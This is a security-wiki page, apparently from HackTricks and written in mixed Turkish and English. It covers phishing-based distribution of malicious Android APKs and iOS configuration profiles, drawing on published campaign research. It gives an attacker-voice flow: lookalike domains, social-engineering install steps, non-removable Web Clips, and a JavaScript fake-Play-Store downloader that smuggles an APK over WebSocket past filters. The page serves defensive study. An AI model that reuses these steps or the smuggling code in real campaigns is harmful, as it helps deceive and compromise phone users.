# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin phishing (SEO, social engineering, sahte mağazalar, dating uygulamaları vb.) yoluyla **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandığı teknikleri ele alır.
> Materyal, Zimperium zLabs (2025) tarafından ortaya çıkarılan SarangTrap campaign ve diğer public research çalışmalarından uyarlanmıştır.<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Birbirine benzeyen onlarca domain kaydedin (dating, cloud share, car service…).
– Google'da sıralamaya girmek için `<title>` elementinde yerel dilde keywords ve emojis kullanın.
– Aynı landing page üzerinde hem Android (`.apk`) hem de iOS install instructions barındırın.
2. **First Stage Download**
* Android: *unsigned* veya “third-party store” APK'ya direct link.
* iOS: malicious **mobileconfig** profile yönlendiren `itms-services://` veya düz HTTPS link (aşağıya bakın).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection ve diğer post-install malware davranışları, aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmaktadır.
4. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile**, cihazı “MDM” benzeri supervision işlemine kaydetmek için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.
* Social-engineering instructions:
1. Settings'i açın ➜ *Profile downloaded*.
2. *Install* seçeneğine üç kez dokunun (phishing page üzerinde screenshots).
3. Unsigned profile'a güvenin ➜ attacker, App Store review olmadan *Contacts* ve *Photo* entitlement'larına erişim kazanır.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload'ları, branded bir icon/label ile **phishing URL'sini Home Screen'e sabitleyebilir**.
* Web Clips **full-screen** çalışabilir (browser UI'ını gizler) ve **non-removable** olarak işaretlenebilir; böylece icon'u kaldırmak için victim'ın profile'ı silmesi gerekir.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Düz HTTP; genellikle `api.<phishingdomain>.com` gibi bir HOST header ile port 80 üzerinde.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit edilmesi kolay).

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS ve persistence gibi post-install Android malware tradecraft örnekleri için aşağıdaki sayfaya bakın:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers, static APK link'lerini giderek daha fazla Google Play'e benzeyen lures içine gömülü bir Socket.IO/WebSocket channel ile değiştiriyor. Bu yöntem payload URL'sini gizler, URL/extension filters'larını bypass eder ve gerçekçi bir install UX'i korur.<sup>[[2]](#references)[[4]](#references)</sup>

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Basit kontrollerden neden kaçabildiği:
- Statik bir APK URL'si açığa çıkmaz; payload, WebSocket frame'lerinden bellekte yeniden oluşturulur.
- Doğrudan `.apk` yanıtlarını engelleyen URL/MIME/extension filtreleri, WebSockets/Socket.IO üzerinden tünellenen binary verileri gözden kaçırabilir.
- WebSockets çalıştırmayan crawler'lar ve URL sandbox'ları payload'ı almaz.

Ayrıca WebSocket tradecraft ve tooling için:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Referanslar

- [1] [Romantizmin Karanlık Yüzü: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple cihazları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Endonezya ve Vietnam Android Kullanıcılarını Hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
